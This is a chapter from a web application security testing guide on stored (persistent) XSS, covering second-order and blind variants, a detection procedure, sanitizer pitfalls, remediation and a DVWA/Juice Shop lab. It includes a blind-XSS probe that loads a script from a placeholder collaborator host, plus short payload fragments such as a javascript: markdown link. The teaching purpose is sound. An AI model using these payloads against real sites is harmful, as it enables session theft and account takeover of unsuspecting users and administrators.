# Chapter 9 — Stored XSS

> Stored XSS is the most dangerous of the three classes because the payload is **persisted** by
> the application and served to other users automatically — no per-victim link required. One
> injection can hit every visitor, including administrators. This chapter is about finding
> those persistence paths and reasoning about *who* the payload reaches.

---

## 9.1 What "stored" means

In stored (a.k.a. persistent) XSS, the attacker's payload is saved on the server — in a
database, file, cache, log, or any durable store — and later included in responses to other
users **without proper encoding**. The execution happens whenever someone views the affected
content, potentially long after, and potentially for many victims.

```
Attacker submits payload once  →  app stores it (e.g., as a comment)  →
later, victim loads the page    →  app renders stored payload unencoded  →
payload executes in victim's session, in the app's origin
```

The contrast with reflected XSS is profound:

| | Reflected | Stored |
|---|---|---|
| Where payload lives | in the request | in the server's storage |
| Delivery | attacker must lure each victim to a link | victims arrive naturally |
| Reach | one request, one victim | every viewer of the content |
| Lifetime | one response | until removed |
| Typical severity | high | often critical |

Because stored XSS reaches users you didn't individually target — frequently **moderators and
admins** who review user content — it routinely leads to account takeover and privilege
escalation.

## 9.2 Where payloads get stored (and re-rendered)

Anywhere user data is saved and later displayed is a candidate. Common sinks:

- **Comments, reviews, posts, forum/chat messages.**
- **Profile fields:** display name, bio, "about me," website URL, avatar URL, status.
- **Support tickets / contact forms** rendered in an agent/admin console.
- **Filenames and file metadata** of uploads (shown in listings).
- **Product/catalog data** in marketplaces (seller-controlled descriptions).
- **Configuration/labels** users can set (project names, tags, custom fields).
- **Log entries** displayed in admin dashboards (log injection → stored XSS in the log viewer).
- **Cached responses** and **CDN-stored** content.
- **Imported data** (CSV/JSON imports, API-created records) — bypasses UI validation entirely.

The recurring insight from Chapter 6 applies hard here: **the place you inject is often not the
place it executes.** You might submit a payload in a "device name" field via an API and have it
fire days later in an operations dashboard.

## 9.3 Second-order and "blind" stored XSS

Two important variants:

**Second-order (stored) XSS.** Input enters through one feature and is rendered, unencoded, in a
*different* feature — often one with higher privilege. Example: you set your username with a
payload; it's encoded everywhere on the public site, but the admin "user management" table
renders it raw. The vulnerability is invisible from the attacker's own normal views.

**Blind XSS.** You inject a payload but never see it execute yourself, because it renders in a
context you can't access (an internal admin tool, a log viewer, a back-office CRM, an email
client). You detect it only when it "calls home." This is extremely common in:

- Contact/feedback forms (read by staff).
- User-agent / referer logging (viewed in analytics dashboards).
- Order notes, shipping instructions, job applications, abuse reports.

To detect blind XSS, testers use a payload that triggers an out-of-band callback to a server
they control, embedding contextual data so they can tell *where* it fired. Conceptually:

```html
<!-- Conceptual blind-XSS probe: loads a remote script that beacons back context -->
<script src="https://YOUR-COLLABORATOR-HOST/x"></script>
<!-- or an image/SVG variant when <script> is filtered -->
```

Specialized tooling (e.g., "XSS Hunter"-style collectors, or your proxy's out-of-band
interaction client — Chapter 16) captures the callback along with the page URL, DOM snapshot,
cookies you're authorized to view, and user-agent, telling you which internal tool executed it.

> **Ethics reminder ([Chapter 1](../01-legal-and-ethics.md)):** blind XSS by design fires in
> *someone else's* browser, often a staff member. Keep the callback payload benign (beacon +
> context only), ensure the collector is in scope/authorized, tag the payload, and remove stored
> probes afterward. Don't capture more than needed to prove the finding.

## 9.4 Context still rules

Everything from Chapter 8 about context-driven payloads applies identically to stored XSS — the
only difference is persistence and reach. When you inject into a stored field, you must still
ask: in *which* context will it be rendered on the *victim's* page? That can differ per render
location:

- Your bio might appear in element content on your profile but in an `alt` attribute on a
  hover-card and in a `<title>` on the admin tab — three different contexts from one stored
  value. A payload may need to work in the *highest-value* render context (the admin one).
- Encoding may be applied inconsistently across render locations (encoded on the public page,
  raw in the admin view) — the essence of second-order XSS.

So map *all* render locations of a stored field, classify each context, and target the
unencoded, highest-reach one.

## 9.5 The amplification factors that make stored XSS critical

When scoping impact, consider:

- **Audience size and privilege.** Does it hit every user? Admins? The more privileged the
  viewer, the worse — admin XSS often means full app compromise.
- **Persistence and worming.** A stored payload on a social feature can be self-propagating: it
  executes in a viewer's session and uses their access to post itself again (a "self-XSS worm").
  Historically, social platforms have suffered fast-spreading XSS worms this way. You do **not**
  build a worm during testing; you note the *potential* for self-propagation as an aggravating
  factor.
- **Bypassing CSRF protections.** Because stored XSS runs *as* the victim in the victim's
  origin, it can read anti-CSRF tokens and make authenticated state changes — defeating CSRF
  defenses entirely.
- **Reaching internal tools.** Blind/second-order paths can pop browsers behind the perimeter.

## 9.6 Detecting stored XSS (procedure)

1. **Inventory storage points** (Chapter 6): every field/feature that persists user data,
   including API-only and import paths.
2. **Inject tagged, benign probes.** Use a unique marker per field, e.g.,
   `zqxj-bio` → `<b>zqxj-bio</b>` first (HTML injection check), escalating to a benign
   executing payload only after confirming markup interprets and you've confirmed scope.
3. **Enumerate every render location** of that stored value — public pages, hover cards,
   listings, exports, emails, and especially **admin/staff views**. Use an account you control
   for any privileged view, or a blind-XSS collector for views you can't see.
4. **Classify context + encoding at each render location.** Find the unencoded, high-reach one.
5. **Confirm execution** with a benign signal; for blind cases, confirm via the out-of-band
   callback with contextual data.
6. **Clean up.** Remove or neutralize stored probes (or have the client do so). Record exactly
   what you stored and where, so it can be purged.

A practical tip: because stored payloads linger and can affect real users and colleagues, lead
with the *non-executing* `<b>zqxj</b>` injection to prove the flaw, and only escalate to an
executing payload when necessary and authorized. Often, proving markup interpretation in an
admin view is enough to demonstrate critical risk without ever popping a real admin.

## 9.7 Special considerations for rich-text and markdown features

Many stored-content features intentionally allow *some* HTML (comments with `<b>`, markdown
that renders to HTML, WYSIWYG editors). These are stored-XSS hotspots because the app must walk
the line between "allow formatting" and "block script." Test:

- **Markdown → HTML** conversion: does `[x](javascript:alert(1))` produce a dangerous link?
  Does raw HTML embedded in markdown pass through? Does an `<img>` with `onerror` survive?
- **Sanitizer gaps:** try foreign content (`<svg>`, `<math>`), mutation-XSS-prone structures,
  unusual attributes (`on*`, `style`, `srcset`, `formaction`), and protocol tricks in `href`.
- **Sanitize-then-modify bugs:** if the app sanitizes, then *post-processes* the HTML (e.g.,
  "linkify" URLs, add tracking, rewrite images), the post-processing can reintroduce
  vulnerabilities after the sanitizer ran.

[Chapter 18](../part6/18-defense-remediation.md) covers building these features safely with a
vetted sanitizer and a strict allow-list.

## 9.8 Fixing stored XSS

The fix is — once more — **context-appropriate output encoding at render time**, plus:

- **Encode consistently at *every* render location**, not just the obvious one. Inconsistent
  encoding across views is the root of second-order XSS. Centralize rendering so every consumer
  of a field gets the same safe treatment.
- **For rich text, use a vetted, actively maintained sanitizer** with a strict allow-list,
  applied as close to render as possible, and re-applied if content is transformed afterward.
- **Don't trust "internal" or "admin" views.** Admin dashboards rendering user data are prime
  targets; they need the same encoding as public pages (arguably more, given their privilege).
- **CSP** (Chapter 19) as defense in depth, including on admin/internal apps.
- **Validate import/API paths**, not just the web UI — attackers reach storage through the path
  of least resistance.

The principle that prevents stored XSS is the same that prevents reflected and DOM XSS: treat
data as data at the moment it becomes part of a page, in whatever context that is.

## 9.9 Lab exercise

Using DVWA "XSS (Stored)" or Juice Shop's review/feedback features:

1. Store `<b>zqxj</b>` and confirm it renders as markup somewhere.
2. Identify **all** places the stored value appears (public + any admin/staff view available
   in the lab).
3. Escalate to a benign executing payload in the highest-reach context.
4. If the lab has an "admin/blind" component, set up a local collector and confirm the
   out-of-band callback.
5. Then enable the lab's higher security level (which adds encoding/sanitization) and observe
   the payload neutralized; inspect how the encoding differs per render location.

---

## Key takeaways

- Stored XSS persists server-side and executes for **every viewer** — often including admins —
  making it routinely **critical** and capable of defeating CSRF defenses.
- The injection point is frequently **not** the execution point: hunt **second-order** and
  **blind** paths (admin consoles, log viewers, support tools, imports/APIs).
- Context still dictates the payload; map **all** render locations of a stored value and target
  the **unencoded, highest-privilege** one.
- Detect with tagged benign probes and out-of-band collectors for blind cases; **clean up**
  stored artifacts and keep payloads non-destructive (real users/staff are affected).
- Fix by encoding **consistently at every render location**, using vetted sanitizers for rich
  text, treating admin views as untrusted-data consumers, and layering CSP.

---

[← Previous: Chapter 8 — Reflected XSS](08-xss-reflected.md) | [Next: Chapter 10 — DOM-Based XSS →](10-xss-dom.md)
